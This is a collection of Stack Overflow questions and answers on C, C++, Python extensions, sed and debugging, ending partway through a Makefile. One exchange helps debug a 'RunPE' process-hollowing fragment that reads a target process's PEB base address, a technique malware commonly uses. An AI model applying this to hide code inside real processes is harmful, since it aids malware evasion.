#include BIGPATH""/foo.c""
</code></pre>

<p>I've also tried</p>

<pre><code>#include ""foo"" ##
         ""bar""
</code></pre>

<p>and</p>

<pre><code>#include ""foo"" \
         ""bar""
</code></pre>

<p>To no avail.  Perhaps what I want is impossible?  Help me, stackoverflow kenobi, you're my only hope.</p>

<p><strong>ANSWER</strong>: building on the suggested answer below, here's what actually worked for me:</p>

<pre><code>#define STRINGIFY(x) #x
#define PATH(path) STRINGIFY(/my/very/long/path)
#include PATH(foo.h)
#undef PATH
#undef STRINGIFY
</code></pre>
","9530","","<p>No, you can't, the preprocessor requires the include filename to be a single preprocessing token.  You need to either fix the include search path you're using, or relax the requirement of 80 characters per line.</p>
"
"<p>In implementation section I declare the variable:</p>

<pre><code>double n_YTD_t;
</code></pre>

<p>In main:</p>

<pre><code>NSLog(@""New YTD Sales are: %f "", n_YTD_t);
</code></pre>

<p>generates the following error:  </p>

<blockquote>
  <p>use of undeclared identifier: 'n_YTD_t'</p>
</blockquote>
","9530","","<p><code>main</code> doesn't have any object to access.  You need to provide an instance of your class:</p>

<pre><code>int main(int argc, char **argv)
{
    ...
    MyClass *obj = [[MyClass alloc] init];
    NSLog(@""New YTD Sales are: %f "", obj.n_YTD_t);  // assuming it's a property
    ...
}
</code></pre>
"
"<p>If I have a string, for example, ""ASDFBOB DESUDESUBOBADSF"", how can I remove all mentions of ""bob"" turning the line into ""ASDF DESUDESUADSF""? It would be a great help, thanks!</p>
","9530","","<p>Use <a href=""http://docs.python.org/library/stdtypes.html#str.replace"" rel=""nofollow""><code>str.replace</code></a> with a replacement of the empty string:</p>

<pre><code>&gt;&gt;&gt; x = 'ASDFBOB DESUDESUBOBADSF'
&gt;&gt;&gt; y = x.replace('BOB', '')
&gt;&gt;&gt; y
'ASDF DESUDESUADSF'
</code></pre>

<p>By default, that replaces <em>all</em> instances; if you only want to replace 1 (or up to N) instances, pass that in as the third parameter, e.g. <code>x.replace('BOB', '', 1)</code>.</p>

<p>If you need more powerful replacement functionality, such as case insensitivity or regular expressions, use <a href=""http://docs.python.org/library/re.html#re.sub"" rel=""nofollow""><code>re.sub</code></a> instead.</p>
"
"<p>I have a structure as:</p>

<pre><code>//GUID structure
typedef struct {
    var8 octet[16];
} GPTGUID_t;
</code></pre>

<p>And a long #define as:</p>

<pre><code>#define PTYPE_MRP_UPPER     0x4db80b5ce3c9e316ULL
#define PTYPE_MRP_LOWER     0xae1502f02df97d81ULL
</code></pre>

<p>I wish to copy UPPER part in octet 0 to 7 and LOWER in 8 to 15. 
Unfortunately all attempts including memcpy has failed and given segfault.</p>

<p>I tried something as:</p>

<pre><code>        strcpy(guid.octet[0], PTYPE_MRP_UPPER);
        strcpy(guid.octet[8], PTYPE_MRP_LOWER);
</code></pre>

<p>And also, </p>

<pre><code>memcpy(guid.octet[0], PTYPE_MRP_UPPER, sizeof(PTYPE_MRP_UPPER));
memcpy(guid.octet[8], PTYPE_MRP_LOWER, sizeof(PTYPE_MRP_LOWER));
</code></pre>

<p>Both have failed. Please help me. </p>

<p>Just as a side note:</p>

<pre><code>typedef unsigned char       var8;
typedef unsigned short      var16;
typedef unsigned int        var32;
</code></pre>

<p>However, i am able to extract the individual octets as:</p>

<pre><code>    memcpy( guid.octet, pHdr-&gt;partTypeGUID, sizeof(GPTGUID_t));//copy the partitionTypeGUID
    p1 = getvar64(guid.octet[0]);
    p2 = getvar64(guid.octet[8]);
</code></pre>

<p>where, <code>#define getvar64(x) (*(var64*)(&amp;x))</code></p>
","9530","","<p>You could use a union:</p>

<pre><code>//GUID structure
typedef struct {
    union {
        var8 octet[16];
        uint64_t qword[2];
    };
} GPTGUID_t;

// This copies the bytes in native-endian order; do an endian swap if you need
// non-native order
guid.qword[0] = PTYPE_MRP_UPPER;
guid.qword[1] = PTYPE_MRP_LOWER;
</code></pre>

<p>Note that this is an anonymous union, which is a feature of the C11 language standard, but it's also implemented as a language extension in many C89/C99 compilers; if your compiler doesn't support that, then you'd have to use a named union instead.</p>

<p>Alternatively, if you can't or don't want to modify the definition of <code>GPTGUID_t</code>, you should just copy the bytes in one at a time:</p>

<pre><code>// This stores the bytes in big-endian order
guid.octet[0] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 56);
guid.octet[1] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 48);
guid.octet[2] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 40);
guid.octet[3] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 32);
guid.octet[4] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 24);
guid.octet[5] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 16);
guid.octet[6] = (var8)(PTYPE_MRP_UPPER &gt;&gt; 8);
guid.octet[7] = (var8)(PTYPE_MRP_UPPER);
guid.octet[8] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 56);
guid.octet[9] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 48);
guid.octet[10] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 40);
guid.octet[11] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 32);
guid.octet[12] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 24);
guid.octet[13] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 16);
guid.octet[14] = (var8)(PTYPE_MRP_LOWER &gt;&gt; 8);
guid.octet[15] = (var8)(PTYPE_MRP_LOWER);
</code></pre>
"
"<p>I have the following pointer:</p>

<pre><code>BSTR *PREVIOUS;
</code></pre>

<p>And I want make a new copy to:</p>

<pre><code>BSTR *NEW;
</code></pre>

<p>I want to copy the CONTENTS/DATA (that PREVIOUS is pointing) from PREVIOUS to NEW.</p>

<p>I've just tried the following command, but it doesn't work:</p>

<pre><code>memcpy(NEW,PREVIOUS,SysStringByteLen(*PREVIOUS));
</code></pre>

<p>I dont see any error when compiling because I am working on ATL COM environment. Please help. Thank you!</p>
","9530","","<p><code>BSTR</code> is itself already a pointer, you should almost always use just a plain <code>BSTR</code>, not a <code>BSTR*</code> (which is a pointer to a <code>BSTR</code>).  Ordinarily, you would copy a <code>BSTR</code> with <a href=""http://msdn.microsoft.com/en-us/library/ms891285.aspx""><code>SysAllocString</code></a>:</p>

<pre><code>BSTR NEW = SysAllocString(PREVIOUS);
</code></pre>

<p>If you really do have a pointer to a <code>BSTR</code> (such as via a function's out parameter), then you add a layer of indirection:</p>

<pre><code>BSTR *PREVIOUS = ...;  // This must point to a valid BSTR
BSTR *NEW = ...;  // This must also point to a valid BSTR
*NEW = SysAllocString(*PREVIOUS);
</code></pre>
"
"<p>I am trying to implement the known method of ""Dynamic Forking of Win32 EXE"", which is knows as RunPE.
My problem is that i am can't get the right result of the ""base address"" as it mentioned in the 3rd point at <a href=""http://www.security.org.sg/code/loadexe.html"" rel=""nofollow"">http://www.security.org.sg/code/loadexe.html</a></p>

<p>This is my code:</p>

<pre><code>DWORD* peb;
DWORD* baseAddress;
...snip...

GetThreadContext(hTarget, &amp;contx)

peb = (DWORD *) contx.Ebx;
baseAddress = (DWORD *) contx.Ebx+8;

_tprintf(_T(""The EBX [PEB] is: 0x%08X\nThe base address is: 0x%08X\nThe Entry Point is: 0x%08X\n""), peb, baseAddress, contx.Eax);
</code></pre>

<p>and the output is as follwos:</p>

<blockquote>
  <p>The EBX [PEB] is: 0x7FFD4000 </p>
  
  <p>The base address is: 0x7FFD4020</p>
  
  <p>The Entry Point is: 0x00401000</p>
</blockquote>

<p>I think that my problem is with the implementation of my baseAddress pointer, but i can't figure out exactly what is the issue. Or could be that i havn't understand the above article correctly and baseAddress isn't ImageBase, if so what is baseAddress ?</p>

<p>I have tried to run it under Win 7 64b and Win-XP and on both i am get the same incorrect results.</p>
","9530","","<p>You're just doing pointer arithmetic, you're not actually dereferencing the memory, in this line:</p>

<pre><code>baseAddress = (DWORD *) contx.Ebx+8;
</code></pre>

<p>You're just adding <code>8*sizeof(DWORD) = 32</code> to the value of <code>contx.Ebx</code>.  What you really want to do is read the data at the address of <code>contx.Ebx+8</code> <em>in the new process's address space</em>.  In order to do that, you need to use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680553%28v=vs.85%29.aspx"" rel=""nofollow""><code>ReadProcessMemory</code></a>, and don't bother to cast -- you want to use raw offsets, not offsets multiplied by <code>sizeof(DWORD)</code>, which is what happens when you do pointer arithmetic with <code>DWORD*</code> values.</p>

<p>However, I'd strongly caution you against digging into implementation details like this, which can and do change between different versions of Windows.  Keep in mind that the article you linked to was written in 2004, and it was just a proof-of-concept, so there are likely to be lots of hidden gotchas and unexpected problems in Vista, Windows 7, Windows 8, and future versions.</p>

<p>The Windows API does not have a function that behaves like Unix's <code>fork(2)</code> function, and as a result, you should try as much as possible to avoid needing to fork -- use <code>CreateProcess</code> instead of <code>fork+exec</code> etc.  The <a href=""http://cygwin.com/faq/faq.api.html#faq.api.fork"" rel=""nofollow"">Cygwin implementation of <code>fork</code></a> is ugly and slow, and it can fail unexpectedly due to DLL memory mapping issues.</p>
"
"<p>I'm reading a text on memory as a programming concept. In one of the later chapters, the author makes heavy use of the word 'arena' but never defines it.  I searched for a technical meaning of the word but found nothing.  Here are a few contexts in which the author uses the term 'arena':</p>

<blockquote>
  <p>""The next example of serialization incorporates a strategy called
  memory allocation from a specific arena.""</p>
  
  <p>""...this is useful when dealing with memory leaks or when allocating
  from a specific arena.""</p>
  
  <p>""...if we want to deallocate the memory then we will deallocate the
  whole arena.""</p>
</blockquote>

<p>The author uses the term over 100 times in this one chapter.  The only related definition in the glossary is:</p>

<blockquote>
  <p><strong>allocation from arena</strong> - Technique of allocating an arena first and then
  managing the allocation/deallocation within the arena by the program
  itself (rather then by the process memory manager); used for
  compaction and serialization of complex data structures and objects,
  or for managing memory in safety-critical and /or fault-tolerant
  systems.</p>
</blockquote>

<p>The only related question I've found on SO is <a href=""http://stackoverflow.com/questions/8592018/exception-safety-in-memory-arena"">Exception safety in memory arena 2</a>, and was no help. Can anyone define 'arena' for me given these contexts?</p>
","9530","","<p>Think of it as a synonym for 'heap'.  Ordinarily, your process only has one heap/arena, and all memory allocation happens from there.</p>

<p>But, sometimes you have a situation where you would to group a series of allocations together (e.g. for performance, to avoid fragmentation, etc.).  In that case, it's better to allocate a new heap/arena, and then for any allocation, you can decide which heap to allocate from.</p>

<p>For example, you might have a particle system where lots of objects of the same size are being frequently allocated and deallocated.  To avoid fragmenting memory, you could allocate each particle from a heap which is only used for those particles, and all other allocations would come from the default heap.</p>
"
"<p>For part of a program that I am writing, I need to search a text file to see if a certain word exists in the file, and if it does, I want to print it to the screen. Why is using a for loop to string compare such as this:</p>

<pre><code>int in_dictionary(char dict[][8], char word[], int size) {
int i;

for (i = 0; i&lt;size; i++)
    if (strcmp(word, dict[i]) == 0){
        return 0;
    }
    else{
        return 1;
    }

}
</code></pre>

<p>Not working for me?</p>
","9530","","<p>You're only comparing the <em>first</em> word in the dictionary to the word you're searching for.  You should only return failure after comparing <em>all</em> of the words:</p>

<pre><code>for(...) {
    if(dict[i] matches)
        return MATCH;
}
return NO_MATCH;
</code></pre>

<p>Also, your return values are backwards -- typically, you'd return 0 to indicate failure (no match) and return 1 to indicate success (match).  The exceptions to that are the <code>main()</code> function, by convention, and many POSIX system calls (which return 0 for success and -1 for failure).</p>
"
"<p>I haven't worked with C in ages and as such I've forgotten an embarrassing amount about how C works. I am trying to create a header, 'arrayUtils.h' and a corresponding 'arrayUtils.c' where I define the prototyped functions. Then I am trying to call one of these functions in a second .c file</p>

<p>Header Contents:</p>

<pre><code>#define _OUT_OF_RANGE_ = NAN

#ifndef INT_ALLOCATE_H
#define INT_ALLOCATE_H
int * allocIntArray(const int size);
#endif

#ifndef INT_ACCESS_H
#define INT_ACCESS_H
int accessIntArray(const int index, const int * array, const bool checked);
#endif

#ifndef INT_FREE_H
#define INT_FREE_H
int freeIntArray(int * array);
#endif
</code></pre>

<p>Source for header:</p>

<pre><code>/* Allocates an array of integers equal to length size
 * Args: int size: length of the array
 * Return: Allocated array
 */
int * allocIntArray(const int size){
    /*Assert that size of array is greater than zero*/
    if(size &lt;= 0){
        return(-1);
    }
    else{
        return((int*)malloc(size*sizeof(int)));
    }
}
/* Returns the value of the array 
 * Args: int    index:   position in the array to access
 *       int  * array:   array to access
 *       bool   checked: if the access should be checked or not
 * Returns: integer at position index
 */
int accessIntArray(const int index, const int * array, const bool checked){
    /*unchecked access*/
    if(!checked){
        return(array[index]);
    }
    /*checked access*/
    else{
        if(index &lt;= 0){
            return(_OUT_OF_RANGE_)
        }
        double size = (double)sizeof(array)/(double)sizeof(int)
        if(index =&gt; (int)size){
            return(_OUT_OF_RANGE_)
        }
        else{
            return(array[index])
        }
    }
}

/* Frees the allocated array 
 * Args: int * array: the array to free
 * Returns: 0 on successful completion
 */
int freeIntArray(int * array){
    free(array);
    return(0);
}
</code></pre>

<p>Then calling in a second source file:</p>

<pre><code>#include ""arrayUtil.h""
int main(){
    int * array = allocIntArray(20);
    return(0);
}
</code></pre>

<p>When I compile with:</p>

<pre><code>gcc utilTest.c
</code></pre>

<p>I get this error:</p>

<blockquote>
  <p>arrayUtils.h:10: error: syntax error before ""checked""</p>
</blockquote>

<p>Initially I was using ""bool checked"" in accessIntArray, and got the same error but with bool instead of checked. </p>

<p>Sorry if this isn't a specific question but I'm pretty lost here. </p>
","9530","","<p><code>bool</code> is not a standard type in C.  The C99 language standard added the new type <code>_Bool</code> for a boolean data type, as well as the header file <code>&lt;stdbool.h&gt;</code> which defines <code>bool</code>, <code>true</code>, and <code>false</code> to map to <code>_Bool</code>, <code>(_Bool)1</code>, and <code>(_Bool)0</code> respectively.</p>

<p>If you're compiling using a C99 compiler, just be sure to <code>#include &lt;stdbool.h&gt;</code> before using the <code>bool</code> keyword.  If not, define them yourselves, e.g.:</p>

<pre><code>typedef unsigned char bool;  // or 'int', whichever you prefer
#define true ((bool)1)
#define false ((bool)0)
</code></pre>
"
"<p>I'm writing a <a href=""http://docs.python.org/extending/extending.html"" rel=""nofollow"">Python extension</a> for the functions provided by a GPIO driver. I made progress pretty easily on the simple functions like set_bit() and clear_bit(). But now I need to implement wait_int(), which sleeps until an event is sensed on an input pin and I'm not sure the right way to orchestrate this between c and python. Here's a stripped down example of using the function in c:</p>

<pre><code>main(int argc, char *argv[])
{
    int c;

    //some setup like testing port availability, clearing interrupts, etc
    ...

    while(1)
    {
        printf(""**\n"");
        c = wait_int(1);//sleeps until an interrupt occurs on chip 1
        if(c &gt; 0) {
            printf(""Event sense occured on Chip 1 bit %d\n"",c);
            ++event_count;
        }
        else
            break;
    }

    printf(""Event count = %05d\r"",event_count);
    printf(""\nExiting Now\n"");
}
</code></pre>

<p>Do I just expose wait_int pretty much directly and then do whatever the python equivalent idiom of the infinite loop is? There's also some debouncing that needs to be done. I've done it in c but maybe it could be moved to the python side.</p>
","9530","","<p>You don't need to do anything on the Python side, you can just treat it as a synchronous function.  On the C side, you just block until the event occurs, possibly allowing interrupts.  For example, take a look at the <a href=""http://hg.python.org/cpython/file/73e7bebb3aa4/Modules/timemodule.c#l1518"" rel=""nofollow"">implementation</a> of the <a href=""http://docs.python.org/library/time.html#time.sleep"" rel=""nofollow""><code>time.sleep</code></a> function:</p>

<pre><code>/* LICENSE: http://docs.python.org/license.html */

/* Implement floatsleep() for various platforms.
   When interrupted (or when another error occurs), return -1 and
   set an exception; else return 0. */

static int
floatsleep(double secs)
{
/* XXX Should test for MS_WINDOWS first! */
#if defined(HAVE_SELECT) &amp;&amp; !defined(__BEOS__) &amp;&amp; !defined(__EMX__)
    struct timeval t;
    double frac;
    frac = fmod(secs, 1.0);
    secs = floor(secs);
    t.tv_sec = (long)secs;
    t.tv_usec = (long)(frac*1000000.0);
    Py_BEGIN_ALLOW_THREADS
    if (select(0, (fd_set *)0, (fd_set *)0, (fd_set *)0, &amp;t) != 0) {
#ifdef EINTR
        if (errno != EINTR) {
#else
        if (1) {
#endif
            Py_BLOCK_THREADS
            PyErr_SetFromErrno(PyExc_IOError);
            return -1;
        }
    }
    Py_END_ALLOW_THREADS
#elif defined(__WATCOMC__) &amp;&amp; !defined(__QNX__)
    ...
</code></pre>

<p>All it does is use the <code>select</code> function to sleep for the given period of time.  <code>select</code> is used so that if any signal is received (such as <code>SIGINT</code> from hitting Ctrl+C at the terminal), the system call is interrupted and control returns to Python.</p>

<p>Hence. your implementation can just call the C <code>wait_int</code> function.  If it supports being interrupted by signals, than great, that will allow the user to interrupt it by hitting Ctrl+C, but make sure to react appropriately such that an exception will be thrown (I'm not certain of how this works, but it looks like returning <code>NULL</code> from the top-level function (<code>time_sleep</code> in this example) will do the trick).</p>

<p>Likewise, for better multithreaded performance, surround the wait call with a pair of <code>Py_BEGIN_ALLOW_THREADS</code>/<code>Py_END_ALLOW_THREADS</code> macros, but this is not required, especially if you're not using multithreading at all.</p>
"
"<p>I need to test an Activity <code>onDestroy</code> method followed by <code>onCreate</code> and <code>onRestoreInstanceHandle</code>. I know one way to do this - change screen orientation. But there is another situation when activity is destroyed - other application needs resources, and at some moment Android decides to destroy background activity. However, it still may be restored, with <code>Bundle</code> available. Is there some way to model such situation?</p>
","9530","","<p>I'm not sure what version of Android this became available on, but in at least Jelly Bean, there's a developer option that makes this really easy.  Under <strong>Settings → Developer Options</strong>, scroll down to the Apps section and enable the <strong>Don't keep activities</strong> option.</p>

<p>Then, any time you exit an app (either with the Back button or the Home button), the OS will destroy that app's activity instead of just pausing it and putting it in the background.  Don't forget to unset that setting when you're done testing, though.</p>
"
"<p>From this <a href=""http://codegolf.stackexchange.com/questions/6768/shortest-code-that-return-sigsegv-among-the-given-languages"">question</a>, I've seen a funny code which compile (although with warnings) and produce a segmentation fault (gcc 4.4.4; clang 2.8):</p>

<pre><code>main;
</code></pre>

<p>If we expand it, here is the result:</p>

<pre><code>int main = 0;
</code></pre>

<p>So what is the linker's behavior here?</p>
","9530","","<p>The linker's behavior is that it defines a symbol called <code>main</code> in either the program's data or BSS segment.  It is 4 bytes long and initialized to 0.  Ordinarily, it creates a symbol in the program's code segment (typically called <code>.text</code>) with the executable code for the <code>main</code> function.</p>

<p>The C runtime starts up at a fixed entry point (typically called <code>_start</code>), initializes a bunch of stuff (e.g. sets up the program's arguments), and calls the <code>main</code> function.  When <code>main</code> is executable code, this is all fine and dandy, but if it's instead 4 zero bytes, the program will transfer control to those zero bytes and try to execute them.</p>

<p>Typically, the data and BSS segments are marked as non-executable, so when you try to execute code there, the processor will raise an exception, which the OS will interpret and then terminate your program with a signal.  If somehow the segment it's in is executable, then it will try to execute the machine instructions defined by <code>00 00 00 00</code>.  In x86 and x86-64, that's an illegal instruction, so you'd also get a <code>SIGILL</code> signal in POSIX OSes.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/12135498/why-are-redundant-scope-qualifications-supported-by-the-compiler-and-is-it-lega"">Why are redundant scope qualifications supported by the compiler, and is it legal?</a>  </p>
</blockquote>



<p>I wouldn't expect this to compile but it does. Could this be a compiler bug, or does it have some correct meaning?</p>

<pre><code>$ g++ -c scopes.cpp
$ cat scopes.cpp
class Log {
public:
    Log() { }
    static void fn() { }
};

void test() {
    Log::Log::Log::Log::Log::Log::fn();
}

$ g++ --version
g++ (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3
</code></pre>
","9530","","<p>Yes, it's legal.  A class's name is inserted into its own namespace, which is called the <em>injected-class-name</em>.  From C++03 §9/2:</p>

<blockquote>
  <p>[...] The <em>class-name</em> is also inserted into the scope of the class itself; this is known as the <em>injected-class-name</em>.
  For purposes of access checking, the <em>injected-class-name</em> is treated as if it were a public member name.</p>
</blockquote>

<p>Note that <code>Log::Log</code> names the class constructor, which is only allowed in certain contexts, but as long as you end the chain of <code>Log::Log::...</code> with something other than <code>Log</code> (such as <code>fn</code>), then it doesn't name the constructor.  Specifically, §3.4.3.1/1a says:</p>

<blockquote>
  <p>If the <em>nested-name-specifier</em> nominates a class <code>C</code>, and the name specified after the <em>nested-name-specifier</em>,
  when looked up in <code>C</code>, is the injected-class-name of <code>C</code> (clause 9), the name is instead considered to name the
  constructor of class <code>C</code>. Such a constructor name shall be used only in the <em>declarator-id</em> of a constructor definition
  that appears outside of the class definition.</p>
</blockquote>
"
"<p>Unix noob here.  I'm working on a unix script that does a simple find/replace.  The script is meant to find a line ending in ""_development"", then add a new line that contains the string ""  password: test"".  </p>

<pre><code>#!/bin/sh

sed -e 's/$""_development""/ a\  password: test/'  original_file &gt; new_file
</code></pre>

<p>I don't get any errors when I run this, but it doesn't actually do what I need. It adds the new line, but doesn't add the string.  I think this syntax should work.  Does it matter that I'm cranking this out on a Mac.  Most importantly, what am I doing wrong?  </p>
","9530","","<p>Your search pattern is <code>$""_development""</code>, which looks for an empty string at the end of a line followed by a literal <code>""_development""</code>.  It's impossible to have anything after the end of a line -- you really should write <code>""_development""$</code> instead.  The <code>$</code> always goes at the end.</p>

<p>Something like this should work, assuming you're using a version of sed (such as GNU sed) which can insert newlines:</p>

<pre><code>sed -e 's/""_development""$/\0\n  password: test/' original_file &gt; new_file
</code></pre>

<p>The <code>\0</code> says to use the entire matched pattern (so that we don't delete the <code>""_development""</code> part), and the <code>\n</code> inserts a newline.</p>
"
"<p>I see a segmentation fault like this <code>segfault at 157e8250 ip 157e8250 sp bfa3fdfb</code> how do I map the this address to the corresponding code where the fault occurs?</p>
","9530","","<p>Use the addr2line utility from the <a href=""http://www.gnu.org/software/binutils/"" rel=""nofollow"">GNU binutils</a> suite.  For example, this prints out the filename, line number, and function name (demangling it if it's a C++ function) for the faulting address 0x157e8250:</p>

<pre><code>addr2line -e my_executable_file -C -f 0x157e8250
</code></pre>

<p>You can also pass on any number of addresses in the command line, e.g. if you have a stack trace of only instruction addresses.</p>

<p>Make sure you compile your program with the <code>-g</code> compiler option to generate debugging symbols, otherwise <code>addr2line</code> will not be able to symbolicate anything for you.</p>
"
"<p>I have written C++ program in Visual Studio .NET 2010. Assume I have written a program name ""BubbyProgram"" When I am executing this binaray BunnyProgram.exe. This program is crashing and I have crash file generated as</p>

<p>C__Program Files (x86)BubbyProgram.exe_3952_2012-10-10 13_28_52.519</p>

<p>How can I analyze this crash file to see where the error?</p>

<p>Really appreciate your help.</p>
","9530","","<p>If the file you're looking at is a crash dump or a minidump (typically with a <code>*.dmp</code> or <code>*.mdmp</code> file extension), you can just open it up in Visual Studio and start debugging it.  Right-click it in Explorer, select ""Open with..."", and select Visual Studio.  Then, press F5 to start debugging it.</p>

<p>Visual Studio will then show you the exception that occurred (usually an access violation), the instruction where it occurred, the surrounding code, and the stack trace, depending on how much information is in the dump file.  If you have the right symbol files (<code>*.pdb</code>), it should show you the original source code location where the crash occurred; if not, you might have to tell it where to find the symbol files and/or source code, if it was compiled on a different machine.</p>

<p>You can also use other debuggers such as WinDbg if you want.</p>
"
"<p>I've read two articles describing COM objects as being <em>basically</em> C++ classes. Is this true? Here's one of the articles I am reading: <a href=""http://www.codeproject.com/Articles/13601/COM-in-plain-C"" rel=""nofollow"">http://www.codeproject.com/Articles/13601/COM-in-plain-C</a></p>

<p>It describes a means for creating a COM object in C. COM enforces that the first members of this structure are certain function pointers.</p>

<p>I am not seeing the concrete correlation between COM objects and C++, although I can understand that relationship is easily understood.</p>
","9530","","<p>COM specifies exactly how its objects are to be laid out: with the virtual function table pointer (aka vtable pointer) as the first member in the object.  It's designed so that the layout is identical to how the Microsoft compiler lays out C++ objects, so that you can have a C++ class that compiles identically to a manually defined C structure.</p>

<p>As long as you're using a Microsoft compiler, then yes, a COM object is basically a C++ class instance.  But if you're using a different compiler, you need to take special care to ensure that it lays out C++ objects in the same manner.  As long as you're not using multiple inheritance or virtual inheritance, <em>most</em> compilers will put the vtable first, so it will usually work, but some compilers put the vtable at the end.  Make sure to read your compiler's documentation and figure out if it's COM-compatible or not.</p>
"
"<p>If I want to keep the bulk of my code for processing command line arguments out of main (for organization and more readable code) what would be the best way to do it?</p>

<pre><code>void main(int argc, char* argv[]){
//lots of code here I would like to move elsewhere
}
</code></pre>
","9530","","<p>Either pass them as parameters, or store them in global variables.  As long as you don't return from main and try to process them in an <code>atexit</code> handler or the destructor of an object at global scope, they still exist and will be fine to access from any scope.</p>

<p>For example:</p>

<pre><code>// Passing them as args:
void process_command_line(int argc, char **argv)
{
    // Use argc and argv
    ...
}

int main(int argc, char **argv)
{
    process_command_line(argc, argv);
    ...
}
</code></pre>

<p>Alternatively:</p>

<pre><code>// Global variables
int g_argc;
char **g_argv;

void process_command_line()
{
    // Use g_argc and g_argv
    ...
}

int main(int argc, char **argv)
{
    g_argc = argc;
    g_argv = argv;
    process_command_line();
    ...
}
</code></pre>

<p>Passing them as parameters is a better design, since it's encapsulated and let's you modify/substitute parameters if you want or easily convert your program into a library.  Global variables are easier, since if you have many different functions which access the args for whatever reason, you can just store them once and don't need to keep passing them around between all of the different functions.</p>
"
"<p>Perhaps this is answered out there somewhere and I just don't know the words to search for it.  I am trying to understand if I am seeing a bug or if I don't understand the minus operator.  Is the assignment of the constant in the header causing the compiler to trip over the '-'?</p>

<p>My project has the following structure, including generated files:</p>

<pre>
test
├── src
│   ├── TipCoordinate.cpp
│   └── TipCoordinate.hpp
└── UnitTest
    ├── main.cpp
    ├── main.o
    ├── Makefile
    ├── TipCoordinate.o
    ├── UnitTest.pro
    └── UnitTest.pro.user
</pre>

<p>I have a constant defined in my class header as follows:</p>

<pre><code>class TipCoordinate{
public:
    TipCoordinate() {};
    ~TipCoordinate() {};
    void Z(const float z);
private:
    static const float sREFERENCE_SPHERE_RADIUS = 12;
};
</code></pre>

<p>The following code in my class cpp file will not compile:</p>

<pre><code>#include ""TipCoordinate.hpp""
void TipCoordinate::Z(const float z){
    float z_origin_ = -sREFERENCE_SPHERE_RADIUS;
}
</code></pre>

<p>I receive the error <code>.../model/TipCoordinate.cpp:143: error: undefined reference to 'TipCoordinate::sREFERENCE_SPHERE_RADIUS'</code></p>

<p>However, if I just change it as follows then it is perfectly happy:</p>

<pre><code>#include ""TipCoordinate.hpp""
void TipCoordinate::Z(const float z){
    float z_origin_ = -1*sREFERENCE_SPHERE_RADIUS;
}
</code></pre>

<p>Alternatively, this works also:</p>

<pre><code>#include ""TipCoordinate.hpp""
void TipCoordinate::Z(const float z){
    float z_origin_ = 0-sREFERENCE_SPHERE_RADIUS;
}
</code></pre>

<p>I think that Adam Rosenfield's answer addresses my question, but in response to some of the comments I have replaced the above excerpts with a minimal, complete example that reproduces the problem.  As some surmised, I am using g++.  The version is g++ (Ubuntu/Linaro 4.5.2-8ubuntu4) 4.5.2 and it seems likely that the optimizer is affected because I am using ""Qt Creator 2.1.0, Based on Qt 4.7.2 (32 bit), Built on Mar 11 2011"".  Here is my project file:</p>

<pre><code>QT       -= gui
INCLUDEPATH += ../src
TEMPLATE = app
SOURCES += main.cpp \
    ../src/TipCoordinate.cpp
HEADERS += \
    ../src/TipCoordinate.hpp
</code></pre>

<p>My main file is simply the following, but changing the project template to lib and removing the main file causes the issue to disappear.</p>

<pre><code>int main() { return 0; }
</code></pre>

<p>I suspect that Qt Creator matters because in addition to changing the template, when I change other seemingly irrelevant factors the issue disappears or reappears.  For that reason, I have included the Qt Creator generated Makefile below:</p>

<pre><code>#############################################################################
# Makefile for building: UnitTest
# Generated by qmake (2.01a) (Qt 4.7.3) on: Sun Oct 14 15:05:23 2012
# Project:  UnitTest.pro
# Template: app
# Command: /usr/local/Trolltech/QtEmbedded-4.7.3/bin/qmake -spec /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ CONFIG+=debug QMLJSDEBUGGER_PATH=/usr/share/qtcreator/qml/qmljsdebugger -o Makefile UnitTest.pro
#############################################################################

####### Compiler, tools and options

CC            = gcc
CXX           = g++
DEFINES       = -DQT_NETWORK_LIB -DQT_CORE_LIB -DQT_SHARED
CFLAGS        = -pipe -g -Wall -W -D_REENTRANT $(DEFINES)
CXXFLAGS      = -pipe -g -Wall -W -D_REENTRANT $(DEFINES)
INCPATH       = -I/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ -I. -I/usr/local/Trolltech/QtEmbedded-4.7.3/include/QtCore -I/usr/local/Trolltech/QtEmbedded-4.7.3/include/QtNetwork -I/usr/local/Trolltech/QtEmbedded-4.7.3/include -I../src -I.
LINK          = g++
LFLAGS        = -Wl,-rpath,/usr/local/Trolltech/QtEmbedded-4.7.3/lib
LIBS          = $(SUBLIBS)  -L/usr/local/Trolltech/QtEmbedded-4.7.3/lib -lQtNetwork -L/usr/local/Trolltech/QtEmbedded-4.7.3/lib -lQtCore -lpthread 
AR            = ar cqs
RANLIB        = 
QMAKE         = /usr/local/Trolltech/QtEmbedded-4.7.3/bin/qmake
TAR           = tar -cf
COMPRESS      = gzip -9f
COPY          = cp -f
SED           = sed
COPY_FILE     = $(COPY)
COPY_DIR      = $(COPY) -r
STRIP         = strip
INSTALL_FILE  = install -m 644 -p
INSTALL_DIR   = $(COPY_DIR)
INSTALL_PROGRAM = install -m 755 -p
DEL_FILE      = rm -f
SYMLINK       = ln -f -s
DEL_DIR       = rmdir
MOVE          = mv -f
CHK_DIR_EXISTS= test -d
MKDIR         = mkdir -p

####### Output directory

OBJECTS_DIR   = ./

####### Files

SOURCES       = main.cpp \
        ../src/TipCoordinate.cpp 
OBJECTS       = main.o \
        TipCoordinate.o
DIST          = /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/g++.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/unix.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/linux.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/qws.conf \
